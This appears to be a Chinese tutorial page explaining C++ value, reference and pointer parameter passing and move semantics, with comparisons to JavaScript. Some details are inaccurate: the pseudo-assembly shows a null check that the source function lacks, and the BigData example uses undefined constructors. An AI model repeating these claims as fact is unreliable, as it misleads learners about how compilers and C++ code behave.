pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">核心概念对比</h2>

























<table><thead><tr><th>概念</th><th>C++</th><th>前端 (JS/TS)</th></tr></thead><tbody><tr><td><strong>值传递</strong></td><td>默认方式，完整拷贝</td><td>基本类型 (number, string等)</td></tr><tr><td><strong>引用传递</strong></td><td>需显式使用 <code>&amp;</code> 或指针</td><td>对象、数组、函数等引用类型</td></tr><tr><td><strong>指针传递</strong></td><td>传递内存地址</td><td>类似传递对象的引用</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-1">1. 值传递（默认）- 完整拷贝</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Point</span> {
    <span class="hljs-type">int</span> x, y;
    <span class="hljs-built_in">Point</span>(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b) : <span class="hljs-built_in">x</span>(a), <span class="hljs-built_in">y</span>(b) {
        cout &lt;&lt; <span class="hljs-string">"构造: ("</span> &lt;&lt; x &lt;&lt; <span class="hljs-string">","</span> &lt;&lt; y &lt;&lt; <span class="hljs-string">")"</span> &lt;&lt; endl;
    }
    <span class="hljs-built_in">Point</span>(<span class="hljs-type">const</span> Point&amp; p) : <span class="hljs-built_in">x</span>(p.x), <span class="hljs-built_in">y</span>(p.y) {
        cout &lt;&lt; <span class="hljs-string">"拷贝构造: ("</span> &lt;&lt; x &lt;&lt; <span class="hljs-string">","</span> &lt;&lt; y &lt;&lt; <span class="hljs-string">")"</span> &lt;&lt; endl;
    }
    ~<span class="hljs-built_in">Point</span>() {
        cout &lt;&lt; <span class="hljs-string">"析构: ("</span> &lt;&lt; x &lt;&lt; <span class="hljs-string">","</span> &lt;&lt; y &lt;&lt; <span class="hljs-string">")"</span> &lt;&lt; endl;
    }
};

<span class="hljs-comment">// ❌ 值传递：发生完整拷贝</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">byValue</span><span class="hljs-params">(Point p)</span> </span>{
    p.x = <span class="hljs-number">100</span>;  <span class="hljs-comment">// 修改的是副本，不影响原对象</span>
    cout &lt;&lt; <span class="hljs-string">"函数内: ("</span> &lt;&lt; p.x &lt;&lt; <span class="hljs-string">","</span> &lt;&lt; p.y &lt;&lt; <span class="hljs-string">")"</span> &lt;&lt; endl;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">Point <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)</span></span>;
    cout &lt;&lt; <span class="hljs-string">"--- 调用函数 ---"</span> &lt;&lt; endl;
    <span class="hljs-built_in">byValue</span>(p1);
    cout &lt;&lt; <span class="hljs-string">"--- 函数返回 ---"</span> &lt;&lt; endl;
    cout &lt;&lt; <span class="hljs-string">"原对象: ("</span> &lt;&lt; p1.x &lt;&lt; <span class="hljs-string">","</span> &lt;&lt; p1.y &lt;&lt; <span class="hljs-string">")"</span> &lt;&lt; endl;  <span class="hljs-comment">// 仍是 (1,2)</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>输出：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">构造: (1,2)</span>
--- 调用函数 ---
<span class="hljs-section">拷贝构造: (1,2)</span>
<span class="hljs-section">函数内: (100,2)</span>
<span class="hljs-section">析构: (100,2)</span>
--- 函数返回 ---
<span class="hljs-section">原对象: (1,2)</span>
<span class="hljs-section">析构: (1,2)</span>
</code></pre>
<blockquote>
<p>⚠️ <strong>性能问题</strong>：大对象会发生昂贵的深拷贝</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">2. 引用传递（类似前端引用类型）</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ✅ 引用传递：不拷贝，直接操作原对象（类似前端的对象引用）</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">byReference</span><span class="hljs-params">(Point&amp; p)</span> </span>{
    p.x = <span class="hljs-number">100</span>;  <span class="hljs-comment">// 直接修改原对象！</span>
    cout &lt;&lt; <span class="hljs-string">"函数内: ("</span> &lt;&lt; p.x &lt;&lt; <span class="hljs-string">","</span> &lt;&lt; p.y &lt;&lt; <span class="hljs-string">")"</span> &lt;&lt; endl;
}

<span class="hljs-comment">// ✅ const 引用：只读访问，不拷贝也不能修改</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">byConstReference</span><span class="hljs-params">(<span class="hljs-type">const</span> Point&amp; p)</span> </span>{
    <span class="hljs-comment">// p.x = 100;  // ❌ 编译错误：不能修改const引用</span>
    cout &lt;&lt; <span class="hljs-string">"只读访问: ("</span> &lt;&lt; p.x &lt;&lt; <span class="hljs-string">","</span> &lt;&lt; p.y &lt;&lt; <span class="hljs-string">")"</span> &lt;&lt; endl;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">Point <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)</span></span>;
    
    cout &lt;&lt; <span class="hljs-string">"=== 引用传递 ==="</span> &lt;&lt; endl;
    <span class="hljs-built_in">byReference</span>(p1);
    cout &lt;&lt; <span class="hljs-string">"原对象已被修改: ("</span> &lt;&lt; p1.x &lt;&lt; <span class="hljs-string">","</span> &lt;&lt; p1.y &lt;&lt; <span class="hljs-string">")"</span> &lt;&lt; endl;  <span class="hljs-comment">// (100,2)</span>
    
    cout &lt;&lt; <span class="hljs-string">"\n=== const引用 ==="</span> &lt;&lt; endl;
    <span class="hljs-built_in">byConstReference</span>(p1);
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>与前端对比：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// JavaScript - 对象天然是引用传递</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">modify</span>(<span class="hljs-params">obj</span>) {
    obj.<span class="hljs-property">x</span> = <span class="hljs-number">100</span>;  <span class="hljs-comment">// 直接修改原对象</span>
}
<span class="hljs-keyword">let</span> p = {<span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">2</span>};
<span class="hljs-title function_">modify</span>(p);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">x</span>);  <span class="hljs-comment">// 100 ✅</span>

<span class="hljs-comment">// C++ 必须显式加 &amp; 才能实现同样效果</span>
</code></pre>
<hr/>
<h2 data-id="heading-3">3. 指针传递（C风格，更灵活但危险）</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 指针传递：传递内存地址</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">byPointer</span><span class="hljs-params">(Point* p)</span> </span>{
    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">nullptr</span>) {  <span class="hljs-comment">// 必须检查空指针！</span>
        p-&gt;x = <span class="hljs-number">200</span>;      <span class="hljs-comment">// 使用 -&gt; 访问成员</span>
    }
}

<span class="hljs-comment">// 指针的const版本</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">byConstPointer</span><span class="hljs-params">(<span class="hljs-type">const</span> Point* p)</span> </span>{
    <span class="hljs-comment">// p-&gt;x = 200;  // ❌ 不能修改</span>
    cout &lt;&lt; p-&gt;x &lt;&lt; endl;  <span class="hljs-comment">// ✅ 可以读取</span>
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">Point <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)</span></span>;
    
    <span class="hljs-built_in">byPointer</span>(&amp;p1);  <span class="hljs-comment">// 必须取地址</span>
    cout &lt;&lt; <span class="hljs-string">"修改后: ("</span> &lt;&lt; p1.x &lt;&lt; <span class="hljs-string">","</span> &lt;&lt; p1.y &lt;&lt; <span class="hljs-string">")"</span> &lt;&lt; endl;
    
    <span class="hljs-comment">// 可以传 nullptr（这是与引用的重要区别）</span>
    <span class="hljs-built_in">byPointer</span>(<span class="hljs-literal">nullptr</span>);  <span class="hljs-comment">// ✅ 合法</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>引用 vs 指针对比：</strong></p>






























<table><thead><tr><th>特性</th><th>引用 <code>&amp;</code></th><th>指针 <code>*</code></th></tr></thead><tbody><tr><td>语法</td><td>更简洁，像原对象</td><td>需解引用 <code>-&gt;</code> 或 <code>*</code></td></tr><tr><td>空值</td><td>不能为 null</td><td>可以为 nullptr</td></tr><tr><td>重新绑定</td><td>不能改指向其他对象</td><td>可以指向不同对象</td></tr><tr><td>安全性</td><td>更高（必须初始化）</td><td>需检查空指针</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-4">4. 返回值优化（RVO）与移动语义</h2>
<h3 data-id="heading-5">传统返回值（有拷贝）</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ❌ C++11前：返回时会发生拷贝（或编译器RVO优化）</span>
<span class="hljs-function">Point <span class="hljs-title">createPoint</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">Point <span class="hljs-title">p</span><span class="hljs-params">(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)</span></span>;
    <span class="hljs-keyword">return</span> p;  <span class="hljs-comment">// 理论上会拷贝，但编译器通常优化掉</span>
}

<span class="hljs-comment">// 接收时再次拷贝</span>
Point p2 = <span class="hljs-built_in">createPoint</span>();
</code></pre>
<h3 data-id="heading-6">现代C++：移动语义（C++11起）</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">BigData</span> {
    <span class="hljs-type">int</span>* data;
    <span class="hljs-type">size_t</span> size;
    
    <span class="hljs-comment">// 移动构造函数（转移资源所有权，不拷贝数据）</span>
    <span class="hljs-built_in">BigData</span>(BigData&amp;&amp; other) <span class="hljs-keyword">noexcept</span> 
        : <span class="hljs-built_in">data</span>(other.data), <span class="hljs-built_in">size</span>(other.size) {
        cout &lt;&lt; <span class="hljs-string">"移动构造（偷资源）"</span> &lt;&lt; endl;
        other.data = <span class="hljs-literal">nullptr</span>;  <span class="hljs-comment">// 置空源对象</span>
        other.size = <span class="hljs-number">0</span>;
    }
    
    <span class="hljs-comment">// 移动赋值</span>
    BigData&amp; <span class="hljs-keyword">operator</span>=(BigData&amp;&amp; other) <span class="hljs-keyword">noexcept</span> {
        cout &lt;&lt; <span class="hljs-string">"移动赋值"</span> &lt;&lt; endl;
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> != &amp;other) {
            <span class="hljs-keyword">delete</span>[] data;
            data = other.data;
            size = other.size;
            other.data = <span class="hljs-literal">nullptr</span>;
        }
        <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;
    }
};

<span class="hljs-function">BigData <span class="hljs-title">createBigData</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">BigData <span class="hljs-title">bd</span><span class="hljs-params">(<span class="hljs-number">1000000</span>)</span></span>;  <span class="hljs-comment">// 分配大量内存</span>
    <span class="hljs-keyword">return</span> bd;  <span class="hljs-comment">// 触发移动语义，而非深拷贝！</span>
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    BigData bd1 = <span class="hljs-built_in">createBigData</span>();  <span class="hljs-comment">// 移动构造，几乎零开销</span>
    BigData bd2;
    bd2 = <span class="hljs-built_in">createBigData</span>();          <span class="hljs-comment">// 移动赋值</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-7">5. 最佳实践总结</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ✅ 最佳实践速查表</span>

<span class="hljs-comment">// 1. 小对象（int, double, 小结构体）：直接值传递</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-type">int</span> x, Point p)</span></span>;  

<span class="hljs-comment">// 2. 大对象只读访问：const 引用（性能+安全）</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">process</span><span class="hljs-params">(<span class="hljs-type">const</span> BigData&amp; data)</span></span>;

<span class="hljs-comment">// 3. 需要修改原对象：非const引用</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">modify</span><span class="hljs-params">(Point&amp; p)</span></span>;

<span class="hljs-comment">// 4. 参数可选（可能为空）：指针</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">maybeProcess</span><span class="hljs-params">(BigData* data)</span></span>;  <span class="hljs-comment">// data可以是nullptr</span>

<span class="hljs-comment">// 5. 转移所有权（C++11）：右值引用</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">takeOwnership</span><span class="hljs-params">(BigData&amp;&amp; data)</span></span>;

<span class="hljs-comment">// 6. 返回值：优先返回值（依赖RVO/移动），而非输出参数</span>
<span class="hljs-function">BigData <span class="hljs-title">create</span><span class="hljs-params">()</span></span>;  <span class="hljs-comment">// ✅ 现代C++推荐</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">create</span><span class="hljs-params">(BigData&amp; out)</span></span>;  <span class="hljs-comment">// 旧式风格，避免</span>
</code></pre>
<hr/>
<h2 data-id="heading-8">类比总结</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// C++ 显式控制传递方式</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(Point p)</span></span>;      <span class="hljs-comment">// 值传递（拷贝）    ← 像 JS 的 structuredClone</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(Point&amp; p)</span></span>;     <span class="hljs-comment">// 引用传递（别名）   ← 像 JS 的对象引用</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-type">const</span> Point&amp; p)</span></span>; <span class="hljs-comment">// const引用       ← 像 JS 的只读引用</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(Point* p)</span></span>;     <span class="hljs-comment">// 指针传递         ← 像 JS 的弱引用/可空引用</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(Point&amp;&amp; p)</span></span>;    <span class="hljs-comment">// 右值引用（移动）   ← 像 JS 的 对象转移/解构赋值</span>
</code></pre>
<p><strong>关键区别</strong>：C++ 默认是<strong>值语义</strong>（拷贝），必须显式使用 <code>&amp;</code> 才能获得<strong>引用语义</strong>；而前端（JS）对象默认就是<strong>引用语义</strong>。</p>
<hr/>
<p>以下深入剖析 C++ 中引用传递和指针传递的本质差异。</p>
<h2 data-id="heading-9">核心对比表</h2>








































<table><thead><tr><th>维度</th><th>引用传递 <code>T&amp;</code></th><th>指针传递 <code>T*</code></th></tr></thead><tbody><tr><td><strong>本质</strong></td><td>别名（alias），必须绑定有效对象</td><td>内存地址，可独立存在</td></tr><tr><td><strong>空值</strong></td><td>❌ 不能为 null</td><td>✅ 可以为 <code>nullptr</code></td></tr><tr><td><strong>重新绑定</strong></td><td>❌ 终身绑定，不能改指向</td><td>✅ 可随时指向其他对象</td></tr><tr><td><strong>语法</strong></td><td>使用原对象语法 <code>.</code></td><td>需解引用 <code>-&gt;</code> 或 <code>*</code></td></tr><tr><td><strong>初始化</strong></td><td>必须初始化</td><td>可以延迟初始化</td></tr><tr><td><strong>内存占用</strong></td><td>通常优化为无开销</td><td>占用指针大小（4/8字节）</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-10">本质差异图解</h2>
<pre><code class="hljs language-scss" lang="scss">引用 (&amp;)                    指针 (*)
┌─────────┐                ┌─────────┐
│  引用变量  │ ──→ 对象      │ 指针变量  │ ──→ 对象
│  (别名)   │   (必须存在)   │ (地址)   │   或 ──→ nullptr
└─────────┘                └─────────┘
   语法糖，编译器处理           真正的内存实体
</code></pre>
<hr/>
<h2 data-id="heading-11">代码层面深度对比</h2>
<h3 data-id="heading-12">1. 基础语法差异</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Config</span> {
    <span class="hljs-type">int</span> port;
    string host;
};

<span class="hljs-comment">// ========== 引用版本 ==========</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setupByRef</span><span class="hljs-params">(Config&amp; cfg)</span> </span>{
    <span class="hljs-comment">// 语法：直接使用对象</span>
    cfg.port = <span class="hljs-number">8080</span>;
    cfg.host = <span class="hljs-string">"localhost"</span>;
    
    <span class="hljs-comment">// ❌ 不能检查是否为空（假设一定存在）</span>
    <span class="hljs-comment">// if (&amp;cfg == nullptr) {}  // 无意义，引用不能为null</span>
}

<span class="hljs-comment">// ========== 指针版本 ==========</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setupByPtr</span><span class="hljs-params">(Config* cfg)</span> </span>{
    <span class="hljs-comment">// 语法：必须先检查空指针</span>
    <span class="hljs-keyword">if</span> (cfg == <span class="hljs-literal">nullptr</span>) {
        cerr &lt;&lt; <span class="hljs-string">"错误：配置为空"</span> &lt;&lt; endl;
        <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-comment">// 解引用方式1：-&gt;</span>
    cfg-&gt;port = <span class="hljs-number">8080</span>;
    
    <span class="hljs-comment">// 解引用方式2：*（获取引用后再用.）</span>
    (*cfg).host = <span class="hljs-string">"localhost"</span>;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    Config c{<span class="hljs-number">0</span>, <span class="hljs-string">""</span>};
    
    <span class="hljs-comment">// 引用调用：简单直接</span>
    <span class="hljs-built_in">setupByRef</span>(c);
    
    <span class="hljs-comment">// 指针调用：必须取地址</span>
    <span class="hljs-built_in">setupByPtr</span>(&amp;c);
    <span class="hljs-built_in">setupByPtr</span>(<span class="hljs-literal">nullptr</span>);  <span class="hljs-comment">// ✅ 可以传空，函数内部处理</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-13">2. 重新绑定能力（关键差异）</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">demonstrateRebinding</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>, b = <span class="hljs-number">20</span>;
    
    <span class="hljs-comment">// ========== 引用：终身绑定 ==========</span>
    <span class="hljs-type">int</span>&amp; ref = a;
    ref = b;      <span class="hljs-comment">// ❌ 这不是让ref指向b！而是把b的值赋给a</span>
                  <span class="hljs-comment">// 结果：a = 20, ref仍是a的别名</span>
    
    <span class="hljs-comment">// 想改指向？不可能！</span>
    <span class="hljs-comment">// &amp;ref = b;   // 编译错误！</span>
    
    <span class="hljs-comment">// ========== 指针：灵活重定向 ==========</span>
    <span class="hljs-type">int</span>* ptr = &amp;a;
    cout &lt;&lt; *ptr;  <span class="hljs-comment">// 10</span>
    
    ptr = &amp;b;      <span class="hljs-comment">// ✅ 随时改指向</span>
    cout &lt;&lt; *ptr;  <span class="hljs-comment">// 20</span>
    
    ptr = <span class="hljs-literal">nullptr</span>; <span class="hljs-comment">// ✅ 可以指向空</span>
}
</code></pre>
<h3 data-id="heading-14">3. 多级间接访问</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 指针可以指向指针，引用不行</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pointerChain</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">int</span> x = <span class="hljs-number">42</span>;
    <span class="hljs-type">int</span>* p = &amp;x;
    <span class="hljs-type">int</span>** pp = &amp;p;      <span class="hljs-comment">// ✅ 指针的指针</span>
    <span class="hljs-type">int</span>*** ppp = &amp;pp;   <span class="hljs-comment">// ✅ 可以无限套娃</span>
    
    cout &lt;&lt; ***ppp;     <span class="hljs-comment">// 42</span>
    
    <span class="hljs-comment">// 引用只有一级（引用的引用被折叠）</span>
    <span class="hljs-type">int</span>&amp; r = x;
    <span class="hljs-comment">// int&amp;&amp; rr = r;    // 这是右值引用，不是引用的引用！</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-15">本质差异：编译器视角</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 源代码</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">byRef</span><span class="hljs-params">(<span class="hljs-type">int</span>&amp; r)</span> </span>{ r = <span class="hljs-number">10</span>; }
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">byPtr</span><span class="hljs-params">(<span class="hljs-type">int</span>* p)</span> </span>{ *p = <span class="hljs-number">10</span>; }

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">int</span> x = <span class="hljs-number">5</span>;
    <span class="hljs-built_in">byRef</span>(x);
    <span class="hljs-built_in">byPtr</span>(&amp;x);
}
</code></pre>
<p><strong>编译后的伪代码：</strong></p>
<pre><code class="hljs language-asm" lang="asm">; 引用版本（编译器优化后，与指针相同）
byRef:
    mov eax, [esp+4]    ; 取地址（与指针一样！）
    mov dword [eax], 10 ; 解引用赋值
    
; 指针版本
byPtr:
    mov eax, [esp+4]    ; 取地址
    test eax, eax       ; ✅ 检查空指针（编译器可能优化掉）
    je .null_handler
    mov dword [eax], 10
    
; 结论：引用是指针的语法糖，但编译器保证非空
</code></pre>
<blockquote>
<p><strong>本质真相</strong>：引用在底层<strong>就是指针</strong>，但编译器添加了<strong>非空约束</strong>和<strong>自动解引用</strong>的语法糖。</p>
</blockquote>
<hr/>
<h2 data-id="heading-16">适用场景详解</h2>
<h3 data-id="heading-17">✅ 引用传递适用场景</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 场景1：参数必须存在（业务逻辑要求）</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">connectDatabase</span><span class="hljs-params">(<span class="hljs-type">const</span> ConnectionConfig&amp; config)</span> </span>{
    <span class="hljs-comment">// 配置必须提供，不存在"无配置"的情况</span>
    <span class="hljs-comment">// 无需检查空，简化代码</span>
}

<span class="hljs-comment">// 场景2：操作符重载（只能用引用）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Vector</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// 必须返回引用才能链式赋值：v1 = v2 = v3</span>
    Vector&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> Vector&amp; other) {
        <span class="hljs-comment">// ...</span>
        <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;  <span class="hljs-comment">// 解引用返回引用</span>
    }
    
    <span class="hljs-comment">// 下标运算符</span>
    <span class="hljs-type">int</span>&amp; <span class="hljs-keyword">operator</span>[](<span class="hljs-type">size_t</span> index) {
        <span class="hljs-keyword">return</span> data[index];  <span class="hljs-comment">// 必须返回引用才能：v[0] = 10</span>
    }
};

<span class="hljs-comment">// 场景3：函数式编程风格（明确所有权）</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; data)</span></span>;           <span class="hljs-comment">// 修改原数据</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; data)</span></span>;    <span class="hljs-comment">// 只读访问</span>
</code></pre>
<h3 data-id="heading-18">✅ 指针传递适用场景</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 场景1：参数可选（可为空）</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">logMessage</span><span class="hljs-params">(<span class="hljs-type">const</span> string* prefix = <span class="hljs-literal">nullptr</span>)</span> </span>{
    <span class="hljs-keyword">if</span> (prefix) {
        cout &lt;&lt; <span class="hljs-string">"["</span> &lt;&lt; *prefix &lt;&lt; <span class="hljs-string">"] "</span>;
    }
    cout &lt;&lt; <span class="hljs-string">"日志内容"</span> &lt;&lt; endl;
}
<span class="hljs-comment">// 调用：logMessage(); 或 logMessage(&amp;debugTag);</span>

<span class="hljs-comment">// 场景2：动态内存管理（所有权转移）</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">processLargeFile</span><span class="hljs-params">(unique_ptr&lt;FileData&gt;* filePtr)</span> </span>{
    <span class="hljs-comment">// 可能转移所有权，或释放内存</span>
    <span class="hljs-keyword">if</span> (filePtr &amp;&amp; *filePtr) {
        <span class="hljs-keyword">auto</span> data = std::<span class="hljs-built_in">move</span>(*filePtr);  <span class="hljs-comment">// 接管所有权</span>
        <span class="hljs-comment">// filePtr 现在指向空unique_ptr</span>
    }
}

<span class="hljs-comment">// 场景3：C接口兼容/多态数组</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">drawShapes</span><span class="hljs-params">(Shape** shapes, <span class="hljs-type">size_t</span> count)</span> </span>{
    <span class="hljs-comment">// 指针数组，支持运行时多态</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; count; ++i) {
        shapes[i]-&gt;<span class="hljs-built_in">draw</span>();  <span class="hljs-comment">// 虚函数调用</span>
    }
}

<span class="hljs-comment">// 场景4：需要重新指向（迭代、遍历）</span>
<span class="hljs-function">Node* <span class="hljs-title">findNode</span><span class="hljs-params">(Node* head, <span class="hljs-type">int</span> value)</span> </span>{
    Node* current = head;      <span class="hljs-comment">// 从head开始</span>
    <span class="hljs-keyword">while</span> (current) {
        <span class="hljs-keyword">if</span> (current-&gt;val == value) <span class="hljs-keyword">return</span> current;
        current = current-&gt;next;  <span class="hljs-comment">// ✅ 指针可以遍历</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
}
<span class="hljs-comment">// 如果用引用：Node&amp; current = head; current = ... 会修改原head！</span>
</code></pre>
<hr/>
<h2 data-id="heading-19">现代C++的最佳实践</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 🏆 参数传递决策树</span>

<span class="hljs-comment">// 1. 小对象（&lt;= 2个指针大小）：值传递</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-type">int</span> x, Point p)</span></span>;

<span class="hljs-comment">// 2. 只读大对象：const 引用（首选）</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">process</span><span class="hljs-params">(<span class="hljs-type">const</span> BigData&amp; data)</span></span>;

<span class="hljs-comment">// 3. 必须修改原对象：非const 引用</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">modify</span><span class="hljs-params">(Config&amp; cfg)</span></span>;

<span class="hljs-comment">// 4. 参数可选/可为空：指针</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">render</span><span class="hljs-params">(<span class="hljs-type">const</span> Camera* cam = <span class="hljs-literal">nullptr</span>)</span></span>;

<span class="hljs-comment">// 5. 转移所有权（C++11）：右值引用</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">consume</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp;&amp; data)</span></span>;

<span class="hljs-comment">// 6. 动态数组/多态：智能指针</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">loadModel</span><span class="hljs-params">(shared_ptr&lt;Mesh&gt; mesh)</span></span>;      <span class="hljs-comment">// 共享所有权</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">takeData</span><span class="hljs-params">(unique_ptr&lt;Buffer&gt; buffer)</span></span>;   <span class="hljs-comment">// 独占所有权</span>
</code></pre>
<hr/>
<h2 data-id="heading-20">一句话总结</h2>
<blockquote>
<p><strong>引用是"承诺存在的别名"，指针是"可能为空的地址"。</strong></p>
